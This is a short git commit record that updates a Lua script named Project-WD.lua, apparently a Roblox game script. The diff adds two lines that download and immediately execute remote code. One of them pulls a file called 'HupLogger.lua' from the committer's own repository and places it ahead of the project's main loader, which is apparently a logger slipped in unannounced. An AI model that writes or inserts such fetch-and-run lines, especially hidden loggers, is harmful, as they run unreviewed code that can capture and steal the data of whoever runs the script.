ada923b4e4b00faf3ef087ee3956185889a57204
Bulba 001 <87039622+ProPvp234@users.noreply.github.com>
2023-04-07 22:48:07 +0200

    Update Project-WD.lua

--- Project-WD.lua
+++ Project-WD.lua
@@ -1,1 +1,2 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ProPvp234/HupHub/main/HupLogger.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua"))()
